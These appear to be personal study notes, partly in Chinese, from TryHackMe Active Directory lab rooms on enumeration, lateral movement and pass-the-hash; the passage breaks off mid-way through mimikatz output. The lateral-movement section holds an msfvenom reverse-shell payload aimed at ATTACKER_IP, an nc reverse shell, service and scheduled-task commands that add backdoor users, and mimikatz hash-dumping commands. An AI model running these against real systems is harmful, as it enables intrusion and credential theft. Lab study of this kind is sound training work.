+<h4 id="Relaying-the-Challenge"><a href="#Relaying-the-Challenge" class="headerlink" title="Relaying the Challenge"></a>Relaying the Challenge</h4><p>An SMB relay attack forwards a live authentication challenge to a target server, but its success depends on two critical factors: SMB signing must not be enforced, and the victim’s account must have sufficient permissions on the target. Consequently, these attacks are difficult to perform ‘blind’ and are more commonly used for lateral movement after an initial network compromise.</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6baba3537d36d0fa78c6f61cf1386f6f.png"></p>
+<h3 id="Microsoft-Deployment-Toolkit"><a href="#Microsoft-Deployment-Toolkit" class="headerlink" title="Microsoft Deployment Toolkit"></a>Microsoft Deployment Toolkit</h3><h4 id="MDT-and-SCCM"><a href="#MDT-and-SCCM" class="headerlink" title="MDT and SCCM"></a>MDT and SCCM</h4><p>Microsoft Deployment Toolkit (MDT) automates the initial deployment of new operating systems across a network, while System Center Configuration Manager (SCCM) handles the ongoing patch management and software updates for those systems. While these tools offer efficient, centralized IT management, they are also high-value targets for attackers, as compromising them could lead to a widespread network takeover.</p>
+<h4 id="PXE-boot"><a href="#PXE-boot" class="headerlink" title="PXE boot"></a>PXE boot</h4><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/8117a18103e98ee2ccda91fc87c63606.png" alt="|500"></p>
+<h3 id="Coonfiguration-files"><a href="#Coonfiguration-files" class="headerlink" title="Coonfiguration files"></a>Coonfiguration files</h3><p>various configuration files may be of value for enumeration: </p>
+<ul>
+<li>Web application config files  </li>
+<li>Service configuration files</li>
+<li>Registry keys</li>
+<li>Centrally deployed applications</li>
+</ul>
+<h2 id="Enumerating-Active-Directory"><a href="#Enumerating-Active-Directory" class="headerlink" title="Enumerating Active Directory"></a>Enumerating Active Directory</h2><h3 id="Why-AD-Enumeration"><a href="#Why-AD-Enumeration" class="headerlink" title="Why AD Enumeration"></a>Why AD Enumeration</h3><p><img src="/THM-AD.assets/image-20251118160159074.png" alt="|700"></p>
+<ul>
+<li>The AD snap-ins of the Microsoft Management Console.  </li>
+<li>The net commands of Command Prompt.</li>
+<li>The AD-RSAT cmdlets of PowerShell.</li>
+<li>Bloodhound.</li>
+</ul>
+<h3 id="Credenticla-injection"><a href="#Credenticla-injection" class="headerlink" title="Credenticla injection"></a>Credenticla injection</h3><p>we can use Runas, a legitimate Windows binary, to inject the credentials into memory.</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas.<span class="keyword">exe</span> /netonly /user:<span class="symbol">&lt;domain&gt;</span>\<span class="symbol">&lt;username&gt;</span> cmd.<span class="keyword">exe</span></span><br></pre></td></tr></table></figure></div>
+<p>用这个命令后，你本地操作还是老样子，但上网访问域内资源时，会自动用你输入的域账号密码，不用每次手动输了。适合自己电脑没加入域，但需要临时用域账号访问域内资源的场景。</p>
+<p>SYSVOL is a folder that exists on all domain controllers. It is a shared folder storing the Group Policy Objects (GPOs) and information along with any other domain related scripts<br><code>C:\Tools&gt;dir \\za.tryhackme.com\SYSVOL\</code></p>
+<p><strong>Question:</strong> <em>Is there a difference between</em> <em><code>dir \\za.tryhackme.com\SYSVOL</code> and <code>dir \\&lt;DC IP&gt;\SYSVOL</code></em> <em>and why the big fuss about DNS?</em><br>hostname :  Kerberos authentication.   IP: NTLM</p>
+<h3 id="Enumeration-through-Microsoft-Management-Console"><a href="#Enumeration-through-Microsoft-Management-Console" class="headerlink" title="Enumeration through Microsoft Management Console"></a>Enumeration through Microsoft Management Console</h3><p>We will be using the Microsoft Management Console (MMC) with the <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps">Remote Server Administration Tools’</a> (RSAT) AD Snap-Ins.</p>
+<ol>
+<li>Press <strong>Start</strong></li>
+<li>Search <strong>“Apps &amp; Features”</strong> and press enter</li>
+<li>Click <strong>Manage Optional Features</strong></li>
+<li>Click <strong>Add a feature</strong></li>
+<li>Search for <strong>“RSAT”</strong></li>
+<li>Select “<strong>RSAT: Active Directory Domain Services and Lightweight Directory Tools”</strong> and click <strong>Install</strong></li>
+</ol>
+<p>use mmc (win + r)</p>
+<ol>
+<li>Click <strong>File</strong> -&gt; <strong>Add&#x2F;Remove Snap-in</strong></li>
+<li>Select and <strong>Add</strong> all three Active Directory Snap-ins</li>
+<li>Click through any errors and warnings  </li>
+<li>Right-click on <strong>Active Directory Domains and Trusts</strong> and select <strong>Change Forest</strong></li>
+<li>Enter <em>za.tryhackme.com</em> as the <strong>Root domain</strong> and Click <strong>OK</strong></li>
+<li>Right-click on <strong>Active Directory Sites and Services</strong> and select <strong>Change Forest</strong></li>
+<li>Enter <em>za.tryhackme.com</em> as the <strong>Root domain</strong> and Click OK</li>
+<li>Right-click on <strong>Active Directory Users and Computers</strong> and select <strong>Change Domain</strong></li>
+<li>Enter <em>za.tryhackme.com</em> as the <strong>Domain</strong> and Click <strong>OK</strong></li>
+<li>Right-click on <strong>Active Directory Users and Computers</strong> in the left-hand pane  </li>
+<li>Click on <strong>View</strong> -&gt; <strong>Advanced Features</strong></li>
+</ol>
+<h3 id="Enumeration-through-Command-Prompt"><a href="#Enumeration-through-Command-Prompt" class="headerlink" title="Enumeration through Command Prompt"></a>Enumeration through Command Prompt</h3><p>Remote Access Trojan (RAT)<br>use some net command to get informaiton.<br><code>net user /domain</code> <code>net accounts /domain</code>(We can use the <code>net</code> command to enumerate the password policy of the domain by using the <code>accounts</code> sub-option:)</p>
+<h3 id="Enumeration-through-PowerShell"><a href="#Enumeration-through-PowerShell" class="headerlink" title="Enumeration through PowerShell"></a>Enumeration through PowerShell</h3><p>it also provides access to <strong>cmdlets</strong> (pronounced command-lets), which are .NET classes to perform specific functions.</p>
+<p><code>Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties *</code></p>
+<ul>
+<li>-Identity - The account name that we are enumerating</li>
+<li>-Properties - Which properties associated with the account will be shown, * will show all properties</li>
+<li>-Server - Since we are not domain-joined, we have to use this parameter to point it to our domain controller<br><code>Get-ADUser -Filter &#39;Name -like &quot;*stevens&quot;&#39; -Server za.tryhackme.com | Format-Table Name,SamAccountName -A</code><br> - <code>-Filter</code> parameter that allows more control over enumeration (cmdlets)<br> - <code>Format-Table</code> cmdlet to display the results such as the following neatly(cmdlets)</li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">PS</span> C:\&gt; $ChangeDate = New-Object DateTime(<span class="number">2022</span>, <span class="number">02</span>, <span class="number">28</span>, <span class="number">12</span>, <span class="number">00</span>, <span class="number">00</span>) </span><br><span class="line"><span class="attribute">PS</span> C:\&gt; Get-ADObject -Filter &#x27;whenChanged -gt $ChangeDate&#x27; -includeDeletedObjects -Server za.tryhackme.com</span><br></pre></td></tr></table></figure></div>
+
+<p><code>Get-ADDomain -Server za.tryhackme.com</code></p>
+<h3 id="Enumeration-through-Bloodhound"><a href="#Enumeration-through-Bloodhound" class="headerlink" title="Enumeration through Bloodhound"></a>Enumeration through Bloodhound</h3><p><a href="Windows%E7%9F%A5%E8%AF%86.md#bloodhound">bloodhound</a></p>
+<h2 id="Lateral-Movement-and-Pivoting"><a href="#Lateral-Movement-and-Pivoting" class="headerlink" title="Lateral Movement and Pivoting"></a>Lateral Movement and Pivoting</h2><h3 id="Moving-Through-the-Network"><a href="#Moving-Through-the-Network" class="headerlink" title="Moving Through the Network"></a>Moving Through the Network</h3><p>Usually, we will repeat this cycle several times before reaching our final goal on the network.<br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/beccc46f65b8d16117d3d62f5c5dc380.png" alt="|575"></p>
+<p>it is probably desirable to connect through the developer’s PC rather than Marketing workstation. to evading firewalls,and detection.<br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/89ef601e2332f96e45c64b3baa8d6349.png"><br>There are several ways in which an attacker can move laterally. The simplest way would be to use standard administrative protocols like WinRM, RDP, VNC or SSH to connect to other machines around the network.<br> <strong>Core Concept: Remote UAC</strong><br>distinguish the Local admin account and buildin admin account and doamin admin</p>
+<ul>
+<li>UAC (User Account Control) restricts the privileges of <strong>non-default Local Administrators</strong> when connecting remotely via <strong>non-interactive</strong> protocols.( RPC, SMB or WinRM)</li>
+<li>he only local account that will get full privileges is the default Administrator account.</li>
+<li>Domain accounts with local administration privileges won’t be subject to the same treatment and will be logged in with full administrative privileges.</li>
+</ul>
+<h3 id="Spawning-Processes-Remotely"><a href="#Spawning-Processes-Remotely" class="headerlink" title="Spawning Processes Remotely"></a>Spawning Processes Remotely</h3><p> available methods an attacker has to spawn a process remotely:</p>
+<h4 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h4><ul>
+<li><strong>Ports:</strong> 445&#x2F;TCP (SMB)</li>
+<li><strong>Required Group Memberships:</strong> Administrators<br>It allows an administrator user to run commands remotely on any PC where he has access.<br>The way psexec works is as follows:</li>
+</ul>
+<ol>
+<li>Connect to Admin$ share and upload a service binary. Psexec uses psexesvc.exe as the name.</li>
+<li>Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with <code>C:\Windows\psexesvc.exe</code>.</li>
+<li>Create some named pipes to handle stdin&#x2F;stdout&#x2F;stderr.<br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a488102fe0da47a3667961400cf298d8.png" alt="|500"></li>
+</ol>
+<h4 id="Remote-Process-Creation-Using-WinRM"><a href="#Remote-Process-Creation-Using-WinRM" class="headerlink" title="Remote Process Creation Using WinRM"></a>Remote Process Creation Using WinRM</h4><ul>
+<li><strong>Ports:</strong> 5985&#x2F;TCP (WinRM HTTP) or 5986&#x2F;TCP (WinRM HTTPS)</li>
+<li><strong>Required Group Memberships:</strong> Remote Management Users<br> Windows Remote Management (WinRM) is a web-based protocol used to send Powershell commands to Windows hosts remotely. Most Windows Server installations will have WinRM enabled by default, making it an attractive attack vector.<br> <code>winrs.exe -u:Administrator -p:Mypass123 -r:target cmd</code></li>
+</ul>
+<h4 id="Remotely-Creating-Services-Using-sc"><a href="#Remotely-Creating-Services-Using-sc" class="headerlink" title="Remotely Creating Services Using sc"></a>Remotely Creating Services Using sc</h4><ul>
+<li><strong>Ports:</strong><ul>
+<li>135&#x2F;TCP, 49152-65535&#x2F;TCP (DCE&#x2F;RPC)</li>
+<li>445&#x2F;TCP (RPC over SMB Named Pipes)</li>
+<li>139&#x2F;TCP (RPC over SMB Named Pipes)</li>
+</ul>
+</li>
+<li><strong>Required Group Memberships:</strong> Administrators<br>We can create a service on a remote host with <strong>sc.exe</strong>, a standard tool available in Windows. When using sc, it will try to connect to the <strong>Service Control Manager (SVCCTL</strong>) remote service program through RPC in several ways:</li>
+</ul>
+<ol>
+<li>Endpoint Mapper (EPM) at port 135  usually a dynamic port in the range of 49152-65535.<br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c4f288e73da9c0f4d480ad817b365fe5.png"></li>
+<li>If the latter connection fails, sc will try to reach SVCCTL through SMB named pipes, either on port 445 (SMB) or 139 (SMB over NetBIOS).<br> <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0c425c37d692c771c944e38dca8c5879.png"><br>We can create and start a service named “THMservice” using the following commands:</li>
+</ol>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe \\TARGET create THMservice binPath= <span class="string">&quot;net user munra Pass123 /add&quot;</span> <span class="built_in">start</span>= auto</span><br><span class="line">sc.exe \\TARGET <span class="built_in">start</span> THMservice</span><br></pre></td></tr></table></figure></div>
+<p>To stop and delete the service, we can then execute the following commands:</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe \\TARGET stop THMservice</span><br><span class="line">sc.exe \\TARGET delete THMservice</span><br></pre></td></tr></table></figure></div>
+<h4 id="Creating-Scheduled-Tasks-Remotely"><a href="#Creating-Scheduled-Tasks-Remotely" class="headerlink" title="Creating Scheduled Tasks Remotely"></a>Creating Scheduled Tasks Remotely</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schtasks /s TARGET /RU <span class="string">&quot;SYSTEM&quot;</span> /create /tn <span class="string">&quot;THMtask1&quot;</span> /tr <span class="string">&quot;&lt;command/payload to execute&gt;&quot;</span> /<span class="built_in">sc</span> ONCE /sd <span class="number">01</span>/<span class="number">01</span>/<span class="number">1970</span> /st <span class="number">00</span>:<span class="number">00</span> </span><br><span class="line"></span><br><span class="line">schtasks /s TARGET /run /TN <span class="string">&quot;THMtask1&quot;</span></span><br></pre></td></tr></table></figure></div>
+<p>We set the schedule type (&#x2F;sc) to ONCE<br> the starting date (&#x2F;sd) and starting time (&#x2F;st) won’t matter much anyway.<br> cleanup:</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> schtasks /S TARGET /TN &quot;THMtask1&quot; /DELETE /F</span><br></pre></td></tr></table></figure></div>
+<p>挑战部分： 先用跳板机用runas一个管理员用户 然后用nc64.exe -e cmd.exe 反弹到攻击机的4443端口<br>攻击机上监听的4443端口就是这个管理员用户<br>再攻击机上面用<code>msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe</code> 创建一个木马用<code>smbclient -c &#39;put myservice.exe&#39; -U t1_leonard.summers -W ZA &#39;//thmiis.za.tryhackme.com/admin$/&#39; EZpass4ever</code> 上传到IIS服务器上。<br>用msfconsole监听 use exploit&#x2F;multi&#x2F;handler   set payload windows&#x2F;shell&#x2F;reverse_tcp<br>在管理员的runas窗口用sc.exe 在IIS服务器上创建一个服务<code>sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= &quot;%windir%\myservice.exe&quot; start= auto</code> 执行这个服务就会执行木马，拿到反弹shell</p>
+<h4 id="Moving-Laterally-Using-WMI"><a href="#Moving-Laterally-Using-WMI" class="headerlink" title="Moving Laterally Using WMI"></a>Moving Laterally Using WMI</h4><h5 id="1-核心概念与连接配置-Setup"><a href="#1-核心概念与连接配置-Setup" class="headerlink" title="1. 核心概念与连接配置 (Setup)"></a>1. 核心概念与连接配置 (Setup)</h5><p>在使用 WMI 进行横向移动前，必须建立一个 CIM 会话 (<code>$Session</code>)。</p>
+<h6 id="端口与协议"><a href="#端口与协议" class="headerlink" title="端口与协议"></a>端口与协议</h6><ul>
+<li><strong>DCOM (默认)</strong>:<ul>
+<li>端口: <code>135/TCP</code> (RPC Endpoint Mapper) + <code>49152-65535/TCP</code> (动态端口)。</li>
+<li>原理: RPC over IP。</li>
+</ul>
+</li>
+<li><strong>Wsman (WinRM)</strong>:<ul>
+<li>端口: <code>5985/TCP</code> (HTTP) 或 <code>5986/TCP</code> (HTTPS)。</li>
+<li>原理: 通过 WinRM 协议传输 WMI 指令。</li>
+</ul>
+</li>
+</ul>
+<h6 id="建立会话-Boilerplate-Code"><a href="#建立会话-Boilerplate-Code" class="headerlink" title="建立会话 (Boilerplate Code)"></a>建立会话 (Boilerplate Code)</h6><p>所有后续攻击都需要先运行这段代码来建立连接：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 创建凭证对象</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;Administrator&#x27;</span>; <span class="variable">$password</span> = <span class="string">&#x27;Mypass123&#x27;</span></span><br><span class="line"><span class="variable">$secPass</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="variable">$password</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="variable">$cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential <span class="variable">$username</span>, <span class="variable">$secPass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 配置会话选项 (选择 DCOM 或 Wsman)</span></span><br><span class="line"><span class="variable">$Opt</span> = <span class="built_in">New-CimSessionOption</span> <span class="literal">-Protocol</span> DCOM </span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 建立会话并存入变量 $Session</span></span><br><span class="line"><span class="variable">$Session</span> = <span class="built_in">New-CimSession</span> <span class="literal">-ComputerName</span> TARGET_IP <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-SessionOption</span> <span class="variable">$Opt</span> <span class="literal">-ErrorAction</span> Stop</span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<h5 id="2-远程进程创建-Process-Creation"><a href="#2-远程进程创建-Process-Creation" class="headerlink" title="2. 远程进程创建 (Process Creation)"></a>2. 远程进程创建 (Process Creation)</h5><ul>
+<li><strong>WMI 类</strong>: <code>Win32_Process</code></li>
+<li><strong>方法</strong>: <code>Create</code></li>
+<li><strong>特点</strong>: <strong>无回显</strong> (Blind execution)。你看不到命令的输出，只能用来启动木马或执行静默命令。<br><strong>PowerShell 方式:</strong></li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Command</span> = <span class="string">&quot;cmd.exe /c calc.exe&quot;</span> <span class="comment"># 你的 Payload</span></span><br><span class="line"><span class="built_in">Invoke-CimMethod</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span class="literal">-ClassName</span> Win32_Process <span class="literal">-MethodName</span> Create <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;CommandLine = <span class="variable">$Command</span>&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>Legacy 方式 (CMD wmic):</strong></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /user:Admin /password:Pass /node:TARGET <span class="keyword">process</span> call create <span class="string">&quot;cmd.exe /c calc.exe&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<h5 id="3-远程创建服务-Service-Creation"><a href="#3-远程创建服务-Service-Creation" class="headerlink" title="3. 远程创建服务 (Service Creation)"></a>3. 远程创建服务 (Service Creation)</h5><ul>
+<li><strong>WMI 类</strong>: <code>Win32_Service</code></li>
+<li><strong>关键点</strong>: 服务类型通常设为 <code>16</code> (Win32OwnProcess)。<br><strong>攻击流程:</strong></li>
+</ul>
+<ol>
+<li><strong>创建服务 (Create)</strong>: <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-CimMethod</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span class="literal">-ClassName</span> Win32_Service <span class="literal">-MethodName</span> Create <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">    Name = <span class="string">&quot;THM_Backdoor&quot;</span>;</span><br><span class="line">    DisplayName = <span class="string">&quot;THM_Backdoor&quot;</span>;</span><br><span class="line">    PathName = <span class="string">&quot;net user hacker Pass123 /add&quot;</span>; <span class="comment"># Payload</span></span><br><span class="line">    ServiceType = [<span class="built_in">byte</span>]::Parse(<span class="string">&quot;16&quot;</span>);</span><br><span class="line">    StartMode = <span class="string">&quot;Manual&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
+<li><strong>启动服务 (Start)</strong>: <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取服务对象</span></span><br><span class="line"><span class="variable">$Service</span> = <span class="built_in">Get-CimInstance</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span class="literal">-ClassName</span> Win32_Service <span class="literal">-filter</span> <span class="string">&quot;Name LIKE &#x27;THM_Backdoor&#x27;&quot;</span></span><br><span class="line"><span class="comment"># 启动</span></span><br><span class="line"><span class="built_in">Invoke-CimMethod</span> <span class="literal">-InputObject</span> <span class="variable">$Service</span> <span class="literal">-MethodName</span> StartService</span><br></pre></td></tr></table></figure></div></li>
+<li><strong>清理痕迹 (Cleanup)</strong>: <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-CimMethod</span> <span class="literal">-InputObject</span> <span class="variable">$Service</span> <span class="literal">-MethodName</span> StopService</span><br><span class="line"><span class="built_in">Invoke-CimMethod</span> <span class="literal">-InputObject</span> <span class="variable">$Service</span> <span class="literal">-MethodName</span> Delete</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<hr>
+<h5 id="4-远程计划任务-Scheduled-Tasks"><a href="#4-远程计划任务-Scheduled-Tasks" class="headerlink" title="4. 远程计划任务 (Scheduled Tasks)"></a>4. 远程计划任务 (Scheduled Tasks)</h5><p>利用 PowerShell 内置的任务管理 cmdlets，通过 CIM 会话操作。</p>
+<ul>
+<li><strong>运行身份</strong>: <code>NT AUTHORITY\SYSTEM</code> (提权关键)。<br><strong>攻击流程:</strong></li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 定义动作 (Payload)</span></span><br><span class="line"><span class="variable">$Action</span> = <span class="built_in">New-ScheduledTaskAction</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span class="literal">-Execute</span> <span class="string">&quot;cmd.exe&quot;</span> <span class="literal">-Argument</span> <span class="string">&quot;/c net user hacker /add&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 注册任务 (Create)</span></span><br><span class="line"><span class="built_in">Register-ScheduledTask</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span class="literal">-Action</span> <span class="variable">$Action</span> <span class="literal">-User</span> <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span> <span class="literal">-TaskName</span> <span class="string">&quot;THM_Task&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 立即运行 (Run)</span></span><br><span class="line"><span class="built_in">Start-ScheduledTask</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span class="literal">-TaskName</span> <span class="string">&quot;THM_Task&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 删除任务 (Cleanup)</span></span><br><span class="line"><span class="built_in">Unregister-ScheduledTask</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span class="literal">-TaskName</span> <span class="string">&quot;THM_Task&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<h5 id="5-远程安装-MSI-MSI-Installation"><a href="#5-远程安装-MSI-MSI-Installation" class="headerlink" title="5. 远程安装 MSI (MSI Installation)"></a>5. 远程安装 MSI (MSI Installation)</h5><ul>
+<li><strong>WMI 类</strong>: <code>Win32_Product</code></li>
+<li><strong>前提</strong>: MSI 文件必须<strong>已经存在</strong>于目标机器上 (需要先用 SMB&#x2F;SCP 上传)。<br><strong>PowerShell 方式:</strong></li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-CimMethod</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span class="literal">-ClassName</span> Win32_Product <span class="literal">-MethodName</span> Install <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">    PackageLocation = <span class="string">&quot;C:\Windows\Temp\malware.msi&quot;</span>; </span><br><span class="line">    Options = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    AllUsers = <span class="variable">$false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p><strong>Legacy 方式 (CMD wmic):</strong></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRMSH"><figure class="iseeu highlight /crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /<span class="keyword">node</span><span class="title">:TARGET</span> /user:<span class="keyword">USER</span> <span class="title">product</span> call install <span class="attr">PackageLocation=</span>c:\Windows\Temp\malware.msi</span><br></pre></td></tr></table></figure></div>
+<h4 id="Use-of-Alternate-Authentication-Material"><a href="#Use-of-Alternate-Authentication-Material" class="headerlink" title="Use of Alternate Authentication Material"></a>Use of Alternate Authentication Material</h4><h5 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h5><p>Pass-the-Hash:<br>Although it may seem we can’t really use those hashes, the NTLM challenge sent during authentication can be responded to just by knowing the password hash.<br>To extract NTLM hashes, we can either use mimikatz to read the local SAM or extract hashes directly from LSASS memory.<br><strong>Extracting NTLM hashes from local SAM:</strong></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">mimikatz <span class="comment"># token::elevate</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::sam   </span></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash NTLM: 145e02c50333951f71d13c245d352b50</span><br></pre></td></tr></table></figure></div>
+<p><strong>Extracting NTLM hashes from LSASS memory:</strong></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">mimikatz <span class="comment"># token::elevate</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::msv </span></span><br><span class="line">Authentication Id : 0 ; 308124 (00000000:0004b39c)</span><br><span class="line">Session           : RemoteInteractive from 2 </span><br><span class="line">User Name         : bob.jenkins</span><br><span class="line">Domain            : ZA</span><br><span class="line">Logon Server      : THMDC</span><br><span class="line">Logon Time        : 2022/04/22 